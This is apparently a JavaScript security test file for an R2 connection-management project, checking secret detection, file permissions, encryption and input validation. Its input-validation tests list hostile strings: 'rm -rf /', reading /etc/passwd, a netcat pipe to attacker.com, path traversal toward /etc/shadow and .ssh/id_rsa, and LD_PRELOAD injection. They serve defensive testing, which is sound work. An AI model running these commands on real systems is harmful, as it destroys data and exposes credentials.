/**
 * Security Validation Tests
 *
 * Tests security measures including plaintext detection, encryption validation,
 * secure file permissions, credential protection, and overall security posture
 * of the R2 connection management system.
 *
 * Test scenarios:
 * - Plaintext secret detection
 * - File permission validation
 * - Credential protection measures
 * - Encryption verification
 * - Security configuration validation
 * - Attack surface analysis
 * - Compliance checking
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

/**
 * Run security validation tests
 */
async function runTests(testSuite) {
  const { logger } = testSuite;

  logger.info('Running Security Validation Tests...');

  // Test 1: Plaintext Secret Detection
  await testSuite.runTest('Plaintext Secret Detection', async () => {
    await testPlaintextSecretDetection(testSuite);
  }, { category: 'SECURITY' });

  // Test 2: File Permission Validation
  await testSuite.runTest('File Permission Validation', async () => {
    await testFilePermissionValidation(testSuite);
  }, { category: 'SECURITY' });

  // Test 3: Credential Protection Measures
  await testSuite.runTest('Credential Protection Measures', async () => {
    await testCredentialProtectionMeasures(testSuite);
  }, { category: 'SECURITY' });

  // Test 4: Encryption Verification
  await testSuite.runTest('Encryption Verification', async () => {
    await testEncryptionVerification(testSuite);
  }, {
    category: 'SECURITY',
    skipIf: testSuite.TEST_CONFIG.skipSops ? 'SOPS encryption tests disabled' : false
  });

  // Test 5: Security Configuration Validation
  await testSuite.runTest('Security Configuration Validation', async () => {
    await testSecurityConfigurationValidation(testSuite);
  }, { category: 'SECURITY' });

  // Test 6: Attack Surface Analysis
  await testSuite.runTest('Attack Surface Analysis', async () => {
    await testAttackSurfaceAnalysis(testSuite);
  }, { category: 'SECURITY' });

  // Test 7: Input Validation and Sanitization
  await testSuite.runTest('Input Validation and Sanitization', async () => {
    await testInputValidationSanitization(testSuite);
  }, { category: 'SECURITY' });

  // Test 8: Secure Communication Validation
  await testSuite.runTest('Secure Communication Validation', async () => {
    await testSecureCommunicationValidation(testSuite);
  }, { category: 'SECURITY' });

  // Test 9: Security Audit and Compliance
  await testSuite.runTest('Security Audit and Compliance', async () => {
    await testSecurityAuditCompliance(testSuite);
  }, { category: 'SECURITY' });
}

/**
 * Test plaintext secret detection
 */
async function testPlaintextSecretDetection(testSuite) {
  const { logger } = testSuite;

  logger.debug('Testing plaintext secret detection...');

  const testDir = testSuite.TEST_CONFIG.tempDir;

  // Create test files with various types of secrets
  const testFiles = [
    {
      name: 'aws-keys.txt',
      content: `# AWS access keys
AKIAIOSFODNN7EXAMPLE
AKIDEXAMPLE
AKIA1234567890EXAMPLE
wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
    },
    {
      name: 'cloudflare-tokens.txt',
      content: `# Cloudflare tokens
cf_api_token=abc123def456ghi789
cf_zone_id=1234567890abcdef1234567890abcdef
account_id=abcdef1234567890abcdef1234567890`
    },
    {
      name: 'ssh-keys.txt',
      content: `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA1234567890abcdef...
-----END OPENSSH PRIVATE KEY-----`
    },
    {
      name: 'passwords.txt',
      content: `password=super-secret-password
admin_password=admin123
db_password=database-secret-123`
    },
    {
      name: 'api-keys.txt',
      content: `api_key=sk_live_1234567890abcdef
secret_key=secret_abc123def456
bearer_token=bearer_xyz789uvw123`
    },
    {
      name: 'safe-file.txt',
      content: `# This file contains no secrets
version=1.0.0
name=test-project
description=A test project configuration`
    }
  ];

  // Create test files
  for (const file of testFiles) {
    const filePath = path.join(testDir, file.name);
    fs.writeFileSync(filePath, file.content);
  }

  try {
    // Test the no-plaintext-secrets validator
    const result = await testSuite.execCommand('nix run .#no-plaintext-secrets', { timeout: 30000 });

    if (result.code === 0) {
      logger.warn('Plaintext secret detection may not be working - no secrets found');
    } else {
      logger.debug('Plaintext secret detection working - secrets detected');

      // Verify specific patterns are caught
      const output = result.stderr + result.stdout;

      const secretPatterns = [
        'AKIA', // AWS access key
        'password', // Password fields
        'secret', // Secret keys
        'token', // API tokens
        'BEGIN.*PRIVATE.*KEY' // Private keys
      ];

      const detectedPatterns = secretPatterns.filter(pattern =>
        new RegExp(pattern, 'i').test(output)
      );

      if (detectedPatterns.length === 0) {
        logger.warn('Expected secret patterns not detected in output');
      } else {
        logger.debug(`Detected patterns: ${detectedPatterns.join(', ')}`);
      }
    }

  } catch (error) {
    if (error.message.includes('timeout')) {
      logger.warn('Secret detection process may be hanging');
    } else {
      logger.debug(`Secret detection test: ${error.message}`);
    }
  }

  // Test manual secret detection
  for (const file of testFiles) {
    const filePath = path.join(testDir, file.name);
    const secrets = detectSecretsInFile(filePath);

    if (file.name === 'safe-file.txt') {
      if (secrets.length > 0) {
        logger.warn(`False positive: secrets detected in safe file ${file.name}`);
      }
    } else {
      if (secrets.length === 0) {
        logger.warn(`No secrets detected in file that should contain secrets: ${file.name}`);
      } else {
        logger.debug(`Secrets detected in ${file.name}: ${secrets.length} patterns`);
      }
    }
  }

  // Test real project files for accidental secrets
  const realFiles = [
    'README.md',
    'justfile',
    'flake.nix',
    'r2.yaml.example'
  ];

  for (const filename of realFiles) {
    const filePath = path.join(testSuite.TEST_CONFIG.workDir, filename);
    if (fs.existsSync(filePath)) {
      const secrets = detectSecretsInFile(filePath);

      if (secrets.length > 0) {
        logger.warn(`Potential secrets found in ${filename}: ${secrets.map(s => s.type).join(', ')}`);
      } else {
        logger.debug(`No secrets found in ${filename}`);
      }
    }
  }

  logger.debug('Plaintext secret detection validated successfully');
}

/**
 * Test file permission validation
 */
async function testFilePermissionValidation(testSuite) {
  const { logger } = testSuite;

  logger.debug('Testing file permission validation...');

  // Skip on Windows
  if (process.platform === 'win32') {
    logger.warn('File permission tests skipped on Windows');
    return;
  }

  const workDir = testSuite.TEST_CONFIG.workDir;

  // Check sensitive files have appropriate permissions
  const sensitiveFiles = [
    '.sops.yaml',
    'secrets/.gitkeep',
    'scripts/gen-connection-manifest.js',
    'scripts/gen-wrangler-config.js'
  ];

  for (const filename of sensitiveFiles) {
    const filePath = path.join(workDir, filename);

    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      const mode = stats.mode & parseInt('777', 8);

      // Check for world-writable permissions
      if (mode & parseInt('002', 8)) {
        logger.warn(`File ${filename} is world-writable (security risk)`);
      }

      // Check for group-writable permissions on sensitive files
      if (filename.includes('secret') || filename.includes('key')) {
        if (mode & parseInt('020', 8)) {
          logger.warn(`Sensitive file ${filename} is group-writable`);
        }
      }

      // Executable files should have execute permissions
      if (filename.endsWith('.js') || filename.endsWith('.sh')) {
        if (!(mode & parseInt('100', 8))) {
          logger.warn(`Script ${filename} is not executable`);
        }
      }

      logger.debug(`File permissions: ${filename} - ${mode.toString(8).padStart(3, '0')}`);
    }
  }

  // Check directory permissions
  const sensitiveDirectories = [
    'secrets',
    'scripts',
    '.git' // if exists
  ];

  for (const dirname of sensitiveDirectories) {
    const dirPath = path.join(workDir, dirname);

    if (fs.existsSync(dirPath)) {
      const stats = fs.statSync(dirPath);
      const mode = stats.mode & parseInt('777', 8);

      // Directories should not be world-writable
      if (mode & parseInt('002', 8)) {
        logger.warn(`Directory ${dirname} is world-writable (security risk)`);
      }

      // Secrets directory should be more restrictive
      if (dirname === 'secrets') {
        if (mode & parseInt('044', 8)) {
          logger.warn(`Secrets directory is readable by others`);
        }
      }

      logger.debug(`Directory permissions: ${dirname} - ${mode.toString(8).padStart(3, '0')}`);
    }
  }

  // Test age key file permissions (if exists)
  const ageKeyPaths = [
    process.env.SOPS_AGE_KEY_FILE,
    path.join(process.env.HOME || '/tmp', '.config/sops/age/keys.txt'),
    path.join(process.env.HOME || '/tmp', '.age/keys.txt')
  ].filter(Boolean);

  for (const keyPath of ageKeyPaths) {
    if (fs.existsSync(keyPath)) {
      const stats = fs.statSync(keyPath);
      const mode = stats.mode & parseInt('777', 8);

      // Age keys should be owner-readable only
      if (mode & parseInt('077', 8)) {
        logger.warn(`Age key file ${keyPath} has overly permissive permissions`);
      }

      logger.debug(`Age key permissions: ${keyPath} - ${mode.toString(8).padStart(3, '0')}`);
      break; // Only check first found key file
    }
  }

  // Test temporary file creation permissions
  const testDir = testSuite.TEST_CONFIG.tempDir;
  const testFile = path.join(testDir, 'perm-test.txt');

  fs.writeFileSync(testFile, 'test content');

  try {
    const stats = fs.statSync(testFile);
    const mode = stats.mode & parseInt('777', 8);

    // New files should not be world-writable
    if (mode & parseInt('002', 8)) {
      logger.warn('New files created with world-writable permissions');
    }

    logger.debug(`New file permissions: ${mode.toString(8).padStart(3, '0')}`);

  } finally {
    if (fs.existsSync(testFile)) {
      fs.unlinkSync(testFile);
    }
  }

  logger.debug('File permission validation completed successfully');
}

/**
 * Test credential protection measures
 */
async function testCredentialProtectionMeasures(testSuite) {
  const { logger } = testSuite;

  logger.debug('Testing credential protection measures...');

  // Test environment variable exposure
  const sensitiveEnvVars = [
    'SOPS_AGE_KEY_FILE',
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'CF_API_TOKEN',
    'R2_ACCESS_KEY_ID',
    'R2_SECRET_ACCESS_KEY'
  ];

  for (const envVar of sensitiveEnvVars) {
    if (process.env[envVar]) {
      logger.debug(`Environment variable set: ${envVar}`);

      // Check if value looks like a real credential
      const value = process.env[envVar];
      if (value.length > 10 && !value.includes('example') && !value.includes('test')) {
        logger.warn(`Environment variable ${envVar} may contain real credentials`);
      }
    }
  }

  // Test credential file protection
  const credentialFiles = [
    path.join(process.env.HOME || '/tmp', '.aws/credentials'),
    path.join(process.env.HOME || '/tmp', '.cloudflare/credentials'),
    path.join(process.env.HOME || '/tmp', '.config/sops/age/keys.txt')
  ];

  for (const credFile of credentialFiles) {
    if (fs.existsSync(credFile)) {
      logger.debug(`Credential file exists: ${credFile}`);

      // Check file permissions
      if (process.platform !== 'win32') {
        const stats = fs.statSync(credFile);
        const mode = stats.mode & parseInt('777', 8);

        if (mode & parseInt('077', 8)) {
          logger.warn(`Credential file ${credFile} has overly permissive permissions`);
        }
      }

      // Check file size (very large files might indicate data exposure)
      const stats = fs.statSync(credFile);
      if (stats.size > 10 * 1024) { // 10KB
        logger.warn(`Credential file ${credFile} is unusually large (${stats.size} bytes)`);
      }
    }
  }

  // Test credential masking in logs
  const testCredentials = [
    'AKIAIOSFODNN7EXAMPLE',
    'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    'very-secret-password-123'
  ];

  for (const cred of testCredentials) {
    const masked = maskCredential(cred);

    if (masked === cred) {
      logger.warn('Credential masking may not be working properly');
    } else {
      logger.debug(`Credential masked: ${cred.substring(0, 4)}... -> ${masked}`);
    }
  }

  // Test configuration template safety
  const templatePath = path.join(testSuite.TEST_CONFIG.workDir, 'r2.yaml.example');
  if (fs.existsSync(templatePath)) {
    const templateContent = fs.readFileSync(templatePath, 'utf8');

    // Check for real credentials in example
    const secretPatterns = detectSecretsInContent(templateContent);
    if (secretPatterns.length > 0) {
      logger.warn('Example configuration file may contain real credentials');
    }

    // Check for placeholder patterns
    const placeholders = [
      'your-account-id',
      'your-access-key',
      'your-secret-key',
      'example',
      'placeholder',
      'changeme'
    ];

    const foundPlaceholders = placeholders.filter(placeholder =>
      templateContent.toLowerCase().includes(placeholder.toLowerCase())
    );

    if (foundPlaceholders.length === 0) {
      logger.warn('Example configuration may not have proper placeholder values');
    } else {
      logger.debug(`Template placeholders found: ${foundPlaceholders.join(', ')}`);
    }
  }

  // Test memory protection
  const sopsHelper = require('../helpers/sops-yaml.js');

  // Load configuration and check memory
  const config = await sopsHelper.getEnvironmentConfig('r2', 'dev', true);

  // Simulate credential processing
  if (config.cf_account_id) {
    const processed = processCredentialSafely(config.cf_account_id);
    if (processed.includes(config.cf_account_id)) {
      logger.warn('Credential processing may not properly clear sensitive data');
    }
  }

  logger.debug('Credential protection measures validated successfully');
}

/**
 * Test encryption verification
 */
async function testEncryptionVerification(testSuite) {
  const { logger } = testSuite;

  logger.debug('Testing encryption verification...');

  const testDir = testSuite.TEST_CONFIG.tempDir;

  // Test SOPS encryption strength
  const testSecret = 'very-secret-data-' + crypto.randomBytes(16).toString('hex');
  const testFile = path.join(testDir, 'encryption-test.yaml');

  fs.writeFileSync(testFile, `secret: ${testSecret}\n`);

  try {
    // Encrypt the file
    await testSuite.execCommand(`sops --encrypt --in-place ${testFile}`);

    const encryptedContent = fs.readFileSync(testFile, 'utf8');

    // Verify encryption properties
    if (!encryptedContent.includes('sops:')) {
      throw new Error('File not properly encrypted - missing SOPS metadata');
    }

    if (encryptedContent.includes(testSecret)) {
      throw new Error('Secret still visible in encrypted file');
    }

    // Check encryption algorithm
    if (encryptedContent.includes('age:')) {
      logger.debug('File encrypted with age algorithm');
    } else {
      logger.warn('File may not be using age encryption');
    }

    // Verify MAC/integrity protection
    if (encryptedContent.includes('mac:')) {
      logger.debug('File has MAC for integrity protection');
    } else {
      logger.warn('File may not have integrity protection');
    }

    // Test decryption verification
    const decryptResult = await testSuite.execCommand(`sops --decrypt ${testFile}`);

    if (decryptResult.code !== 0) {
      throw new Error('Decryption verification failed');
    }

    if (!decryptResult.stdout.includes(testSecret)) {
      throw new Error('Decrypted content does not match original');
    }

    // Test encryption entropy
    const encryptedData = encryptedContent.split('\n')
      .filter(line => line.includes('enc:'))
      .join('');

    if (encryptedData.length > 0) {
      const entropy = calculateEntropy(encryptedData);
      logger.debug(`Encrypted data entropy: ${entropy.toFixed(2)}`);

      if (entropy < 4.0) {
        logger.warn('Encrypted data may have low entropy');
      }
    }

  } catch (error) {
    if (error.message.includes('age key') || error.message.includes('SOPS')) {
      logger.warn(`Encryption test skipped: ${error.message}`);
    } else {
      throw error;
    }
  } finally {
    if (fs.existsSync(testFile)) {
      fs.unlinkSync(testFile);
    }
  }

  // Test key rotation capability
  if (process.env.SOPS_AGE_KEY_FILE && fs.existsSync(process.env.SOPS_AGE_KEY_FILE)) {
    const keyContent = fs.readFileSync(process.env.SOPS_AGE_KEY_FILE, 'utf8');
    const keyCount = (keyContent.match(/AGE-SECRET-KEY-/g) || []).length;

    logger.debug(`Age keys available for rotation: ${keyCount}`);

    if (keyCount < 2) {
      logger.info('Consider adding multiple age keys for key rotation capability');
    }
  }

  // Test configuration file encryption status
  const secretsDir = path.join(testSuite.TEST_CONFIG.workDir, 'secrets');

  if (fs.existsSync(secretsDir)) {
    const secretFiles = fs.readdirSync(secretsDir)
      .filter(file => file.endsWith('.yaml') || file.endsWith('.yml'))
      .filter(file => file !== '.gitkeep');

    for (const secretFile of secretFiles) {
      const filePath = path.join(secretsDir, secretFile);
      const content = fs.readFileSync(filePath, 'utf8');

      if (content.includes('sops:')) {
        logger.debug(`Secret file encrypted: ${secretFile}`);
      } else {
        logger.warn(`Secret file may not be encrypted: ${secretFile}`);
      }
    }
  }

  logger.debug('Encryption verification completed successfully');
}

/**
 * Test security configuration validation
 */
async function testSecurityConfigurationValidation(testSuite) {
  const { logger } = testSuite;

  logger.debug('Testing security configuration validation...');

  // Test SOPS configuration
  const sopsConfigPath = path.join(testSuite.TEST_CONFIG.workDir, '.sops.yaml');

  if (fs.existsSync(sopsConfigPath)) {
    const sopsConfig = fs.readFileSync(sopsConfigPath, 'utf8');

    // Check for proper age configuration
    if (!sopsConfig.includes('age:')) {
      logger.warn('SOPS configuration may not include age encryption');
    }

    // Check for path-based rules
    if (!sopsConfig.includes('path_regex:') && !sopsConfig.includes('path:')) {
      logger.warn('SOPS configuration may not have path-based encryption rules');
    }

    // Check for secrets directory protection
    if (!sopsConfig.includes('secrets/')) {
      logger.warn('SOPS configuration may not protect secrets directory');
    }

    logger.debug('SOPS configuration validated');
  } else {
    logger.warn('SOPS configuration file (.sops.yaml) not found');
  }

  // Test gitignore security
  const gitignorePath = path.join(testSuite.TEST_CONFIG.workDir, '.gitignore');

  if (fs.existsSync(gitignorePath)) {
    const gitignoreContent = fs.readFileSync(gitignorePath, 'utf8');

    // Check for sensitive patterns
    const sensitivePatterns = [
      '*.key',
      '*.pem',
      '.env',
      'secrets/',
      '*.secret',
      'credentials'
    ];

    const protectedPatterns = sensitivePatterns.filter(pattern =>
      gitignoreContent.includes(pattern)
    );

    if (protectedPatterns.length === 0) {
      logger.warn('gitignore may not protect sensitive files');
    } else {
      logger.debug(`gitignore protects: ${protectedPatterns.join(', ')}`);
    }

    // Check for overly broad ignores
    const broadPatterns = ['*', '/*', '**/*'];
    const foundBroadPatterns = broadPatterns.filter(pattern =>
      gitignoreContent.includes(pattern)
    );

    if (foundBroadPatterns.length > 0) {
      logger.warn(`gitignore has overly broad patterns: ${foundBroadPatterns.join(', ')}`);
    }
  }

  // Test security policy
  const securityPolicyPath = path.join(testSuite.TEST_CONFIG.workDir, 'SECURITY-POLICY.md');

  if (fs.existsSync(securityPolicyPath)) {
    const policyContent = fs.readFileSync(securityPolicyPath, 'utf8');

    // Check for key security sections
    const securitySections = [
      'plaintext',
      'encryption',
      'sops',
      'age',
      'secret'
    ];

    const foundSections = securitySections.filter(section =>
      policyContent.toLowerCase().includes(section)
    );

    if (foundSections.length > 0) {
      logger.debug(`Security policy covers: ${foundSections.join(', ')}`);
    } else {
      logger.warn('Security policy may be incomplete');
    }
  } else {
    logger.warn('Security policy document not found');
  }

  // Test environment security defaults
  const manifestGen = require('../scripts/gen-connection-manifest.js');

  for (const env of ['dev', 'stg', 'prod']) {
    const manifest = await manifestGen.generateManifest({
      environment: env,
      useTemplate: true,
      dryRun: true
    });

    // Production should have stricter security
    if (env === 'prod') {
      // Check for HTTPS endpoints
      if (!manifest.endpoint.startsWith('https://')) {
        logger.warn(`Production environment using insecure endpoint`);
      }

      // Check for appropriate connection mode
      if (manifest.connection_mode === 'workers-binding' && manifest.credentials) {
        logger.warn('Production using workers-binding with explicit credentials');
      }
    }

    // All environments should use secure endpoints
    if (!manifest.endpoint.startsWith('https://')) {
      logger.warn(`Environment ${env} using insecure endpoint`);
    }
  }

  logger.debug('Security configuration validation completed successfully');
}

/**
 * Test attack surface analysis
 */
async function testAttackSurfaceAnalysis(testSuite) {
  const { logger } = testSuite;

  logger.debug('Testing attack surface analysis...');

  // Analyze exposed ports and services
  const workDir = testSuite.TEST_CONFIG.workDir;

  // Check for development servers in configuration
  const potentialServerFiles = ['wrangler.toml', 'package.json', 'justfile'];

  for (const filename of potentialServerFiles) {
    const filePath = path.join(workDir, filename);

    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf8');

      // Look for server configurations
      const serverPatterns = [
        'port.*[0-9]{4}',
        'localhost',
        '0.0.0.0',
        'dev.*server',
        'wrangler.*dev'
      ];

      for (const pattern of serverPatterns) {
        const regex = new RegExp(pattern, 'gi');
        const matches = content.match(regex);

        if (matches) {
          logger.debug(`Server configuration found in ${filename}: ${matches.join(', ')}`);
        }
      }
    }
  }

  // Analyze script execution paths
  const scriptsDir = path.join(workDir, 'scripts');

  if (fs.existsSync(scriptsDir)) {
    const scriptFiles = fs.readdirSync(scriptsDir)
      .filter(file => file.endsWith('.js') || file.endsWith('.sh'));

    for (const scriptFile of scriptFiles) {
      const scriptPath = path.join(scriptsDir, scriptFile);
      const content = fs.readFileSync(scriptPath, 'utf8');

      // Check for potential command injection vectors
      const injectionPatterns = [
        'eval\\(',
        'exec\\(',
        'system\\(',
        '\\$\\{',
        '\\`.*\\`',
        'shell.*=.*true'
      ];

      for (const pattern of injectionPatterns) {
        const regex = new RegExp(pattern, 'g');
        if (regex.test(content)) {
          logger.warn(`Potential injection vector in ${scriptFile}: ${pattern}`);
        }
      }

      // Check for hardcoded paths
      const pathPatterns = [
        '/tmp/',
        '/var/',
        'C:\\\\',
        '~/\\.'
      ];

      for (const pattern of pathPatterns) {
        const regex = new RegExp(pattern, 'g');
        if (regex.test(content)) {
          logger.debug(`Hardcoded path in ${scriptFile}: ${pattern}`);
        }
      }
    }
  }

  // Analyze network dependencies
  const networkFiles = ['flake.nix', 'package.json', 'justfile'];

  for (const filename of networkFiles) {
    const filePath = path.join(workDir, filename);

    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf8');

      // Look for external URLs
      const urlPattern = /https?:\/\/[^\s\'"]+/gi;
      const urls = content.match(urlPattern) || [];

      for (const url of urls) {
        // Check for potentially risky URLs
        if (url.includes('http://')) {
          logger.warn(`Insecure HTTP URL found in ${filename}: ${url}`);
        }

        // Log external dependencies
        if (!url.includes('github.com') && !url.includes('nixos.org')) {
          logger.debug(`External dependency in ${filename}: ${url}`);
        }
      }
    }
  }

  // Check for exposed configuration
  const exposedConfigFiles = [
    '.env',
    'config.json',
    'secrets.json',
    'credentials.json'
  ];

  for (const configFile of exposedConfigFiles) {
    const configPath = path.join(workDir, configFile);

    if (fs.existsSync(configPath)) {
      logger.warn(`Potentially exposed configuration file: ${configFile}`);

      const content = fs.readFileSync(configPath, 'utf8');
      const secrets = detectSecretsInContent(content);

      if (secrets.length > 0) {
        logger.warn(`Secrets detected in exposed config file: ${configFile}`);
      }
    }
  }

  // Test input validation at entry points
  const entryPoints = [
    { script: 'scripts/gen-connection-manifest.js', args: ['--env', '../../../etc/passwd'] },
    { script: 'scripts/gen-wrangler-config.js', args: ['--output', '/tmp/test'] }
  ];

  for (const entry of entryPoints) {
    const scriptPath = path.join(workDir, entry.script);

    if (fs.existsSync(scriptPath)) {
      try {
        const result = await testSuite.execCommand(
          `${scriptPath} ${entry.args.join(' ')}`,
          { timeout: 10000 }
        );

        // Should reject malicious inputs
        if (result.code === 0) {
          logger.warn(`Script ${entry.script} may not validate inputs properly`);
        }
      } catch (error) {
        logger.debug(`Input validation test: ${entry.script} - ${error.message}`);
      }
    }
  }

  logger.debug('Attack surface analysis completed successfully');
}

/**
 * Test input validation and sanitization
 */
async function testInputValidationSanitization(testSuite) {
  const { logger } = testSuite;

  logger.debug('Testing input validation and sanitization...');

  const scriptsDir = path.join(testSuite.TEST_CONFIG.workDir, 'scripts');

  // Test path traversal protection
  const pathTraversalInputs = [
    '../../../etc/passwd',
    '..\\..\\windows\\system32\\config',
    '/etc/shadow',
    'C:\\Windows\\System32\\config\\SAM',
    '../../.ssh/id_rsa'
  ];

  const scripts = ['gen-connection-manifest.js', 'gen-wrangler-config.js'];

  for (const script of scripts) {
    const scriptPath = path.join(scriptsDir, script);

    if (fs.existsSync(scriptPath)) {
      for (const maliciousInput of pathTraversalInputs) {
        try {
          const result = await testSuite.execCommand(
            `${scriptPath} --output "${maliciousInput}"`,
            { timeout: 10000 }
          );

          if (result.code === 0) {
            logger.warn(`Script ${script} may be vulnerable to path traversal`);
          }
        } catch (error) {
          logger.debug(`Path traversal test: ${script} - ${error.message}`);
        }
      }
    }
  }

  // Test command injection protection
  const commandInjectionInputs = [
    '; rm -rf /',
    '&& cat /etc/passwd',
    '| nc attacker.com 1234',
    '`whoami`',
    '$(id)',
    '${PWD}'
  ];

  for (const script of scripts) {
    const scriptPath = path.join(scriptsDir, script);

    if (fs.existsSync(scriptPath)) {
      for (const maliciousInput of commandInjectionInputs) {
        try {
          const result = await testSuite.execCommand(
            `${scriptPath} --env "${maliciousInput}"`,
            { timeout: 10000 }
          );

          if (result.code === 0) {
            logger.warn(`Script ${script} may be vulnerable to command injection`);
          }
        } catch (error) {
          logger.debug(`Command injection test: ${script} - ${error.message}`);
        }
      }
    }
  }

  // Test environment variable injection
  const envInjectionInputs = [
    'PATH=/tmp:$PATH',
    'LD_PRELOAD=/tmp/malicious.so',
    'NODE_OPTIONS=--inspect=0.0.0.0:9229'
  ];

  for (const envVar of envInjectionInputs) {
    try {
      const [key, value] = envVar.split('=');
      const env = { ...process.env, [key]: value };

      const result = await testSuite.execCommand(
        'just --version',
        { env, timeout: 10000 }
      );

      // Most environment injection attempts should be harmless for this test
      logger.debug(`Environment injection test: ${envVar} - exit code ${result.code}`);

    } catch (error) {
      logger.debug(`Environment injection test: ${envVar} - ${error.message}`);
    }
  }

  // Test input length limits
  const longInput = 'A'.repeat(10000);

  for (const script of scripts) {
    const scriptPath = path.join(scriptsDir, script);

    if (fs.existsSync(scriptPath)) {
      try {
        const result = await testSuite.execCommand(
          `${scriptPath} --env "${longInput}"`,
          { timeout: 10000 }
        );

        if (result.code === 0) {
          logger.warn(`Script ${script} may not have input length limits`);
        }
      } catch (error) {
        logger.debug(`Input length test: ${script} - ${error.message}`);
      }
    }
  }

  // Test special character handling
  const specialChars = [
    '"',
    "'",
    '<',
    '>',
    '&',
    '|',
    ';',
    '\n',
    '\r',
    '\0'
  ];

  for (const script of scripts) {
    const scriptPath = path.join(scriptsDir, script);

    if (fs.existsSync(scriptPath)) {
      for (const char of specialChars) {
        try {
          const result = await testSuite.execCommand(
            `${scriptPath} --env "test${char}value"`,
            { timeout: 5000 }
          );

          // Should handle special characters gracefully
          logger.debug(`Special char test: ${script} with '${char}' - exit code ${result.code}`);

        } catch (error) {
          logger.debug(`Special char test: ${script} with '${char}' - ${error.message}`);
        }
      }
    }
  }

  logger.debug('Input validation and sanitization completed successfully');
}

/**
 * Test secure communication validation
 */
async function testSecureCommunicationValidation(testSuite) {
  const { logger } = testSuite;

  logger.debug('Testing secure communication validation...');

  // Test HTTPS enforcement
  const manifestGen = require('../scripts/gen-connection-manifest.js');

  for (const env of ['dev', 'stg', 'prod']) {
    const manifest = await manifestGen.generateManifest({
      environment: env,
      useTemplate: true,
      dryRun: true
    });

    if (!manifest.endpoint.startsWith('https://')) {
      logger.warn(`Environment ${env} endpoint is not HTTPS: ${manifest.endpoint}`);
    }

    // Check for secure TLS configuration
    if (manifest.endpoint.includes('cloudflarestorage.com')) {
      logger.debug(`Environment ${env} uses Cloudflare R2 (secure by default)`);
    }
  }

  // Test certificate validation configuration
  const scripts = ['gen-connection-manifest.js', 'gen-wrangler-config.js'];
  const scriptsDir = path.join(testSuite.TEST_CONFIG.workDir, 'scripts');

  for (const script of scripts) {
    const scriptPath = path.join(scriptsDir, script);

    if (fs.existsSync(scriptPath)) {
      const content = fs.readFileSync(scriptPath, 'utf8');

      // Check for insecure TLS configurations
      const insecurePatterns = [
        'rejectUnauthorized.*false',
        'NODE_TLS_REJECT_UNAUTHORIZED.*0',
        'strictSSL.*false',
        'verify.*false'
      ];

      for (const pattern of insecurePatterns) {
        const regex = new RegExp(pattern, 'gi');
        if (regex.test(content)) {
          logger.warn(`Insecure TLS configuration in ${script}: ${pattern}`);
        }
      }
    }
  }

  // Test for hardcoded insecure URLs
  const configFiles = ['flake.nix', 'package.json', 'justfile', 'README.md'];

  for (const filename of configFiles) {
    const filePath = path.join(testSuite.TEST_CONFIG.workDir, filename);

    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf8');

      // Look for HTTP URLs
      const httpUrls = content.match(/http:\/\/[^\s\'"]+/gi) || [];

      for (const url of httpUrls) {
        // Exceptions for localhost and known safe URLs
        if (!url.includes('localhost') &&
            !url.includes('127.0.0.1') &&
            !url.includes('example.com')) {
          logger.warn(`Insecure HTTP URL in ${filename}: ${url}`);
        }
      }
    }
  }

  // Test proxy and network security
  const networkEnvVars = [
    'HTTP_PROXY',
    'HTTPS_PROXY',
    'http_proxy',
    'https_proxy',
    'ALL_PROXY'
  ];

  for (const envVar of networkEnvVars) {
    if (process.env[envVar]) {
      const proxyUrl = process.env[envVar];

      if (proxyUrl.startsWith('http://')) {
        logger.warn(`Insecure proxy configuration: ${envVar}=${proxyUrl}`);
      }

      logger.debug(`Proxy configuration: ${envVar}=${proxyUrl}`);
    }
  }

  logger.debug('Secure communication validation completed successfully');
}

/**
 * Test security audit and compliance
 */
async function testSecurityAuditCompliance(testSuite) {
  const { logger } = testSuite;

  logger.debug('Testing security audit and compliance...');

  // Security checklist validation
  const securityChecklist = [
    {
      name: 'Plaintext secrets protection',
      check: () => {
        // Run plaintext detection
        return testSuite.execCommand('nix run .#no-plaintext-secrets', { timeout: 30000 })
          .then(result => result.code !== 0)
          .catch(() => false);
      }
    },
    {
      name: 'SOPS configuration present',
      check: () => {
        const sopsPath = path.join(testSuite.TEST_CONFIG.workDir, '.sops.yaml');
        return fs.existsSync(sopsPath);
      }
    },
    {
      name: 'Security policy documented',
      check: () => {
        const policyPath = path.join(testSuite.TEST_CONFIG.workDir, 'SECURITY-POLICY.md');
        return fs.existsSync(policyPath);
      }
    },
    {
      name: 'Gitignore protects sensitive files',
      check: () => {
        const gitignorePath = path.join(testSuite.TEST_CONFIG.workDir, '.gitignore');
        if (!fs.existsSync(gitignorePath)) return false;

        const content = fs.readFileSync(gitignorePath, 'utf8');
        return content.includes('secrets/') || content.includes('*.key');
      }
    },
    {
      name: 'HTTPS endpoints enforced',
      check: async () => {
        const manifestGen = require('../scripts/gen-connection-manifest.js');
        const manifest = await manifestGen.generateManifest({
          environment: 'prod',
          useTemplate: true,
          dryRun: true
        });
        return manifest.endpoint.startsWith('https://');
      }
    }
  ];

  const auditResults = [];

  for (const item of securityChecklist) {
    try {
      const passed = await item.check();
      auditResults.push({ name: item.name, passed });

      if (passed) {
        logger.debug(`Security check passed: ${item.name}`);
      } else {
        logger.warn(`Security check failed: ${item.name}`);
      }
    } catch (error) {
      auditResults.push({ name: item.name, passed: false, error: error.message });
      logger.warn(`Security check error: ${item.name} - ${error.message}`);
    }
  }

  // Calculate compliance score
  const passedChecks = auditResults.filter(r => r.passed).length;
  const totalChecks = auditResults.length;
  const complianceScore = (passedChecks / totalChecks) * 100;

  logger.debug(`Security compliance score: ${complianceScore.toFixed(1)}% (${passedChecks}/${totalChecks})`);

  if (complianceScore < 80) {
    logger.warn('Security compliance below 80% - review security measures');
  }

  // Generate security report
  const securityReport = {
    timestamp: new Date().toISOString(),
    compliance_score: complianceScore,
    checks_passed: passedChecks,
    checks_total: totalChecks,
    results: auditResults
  };

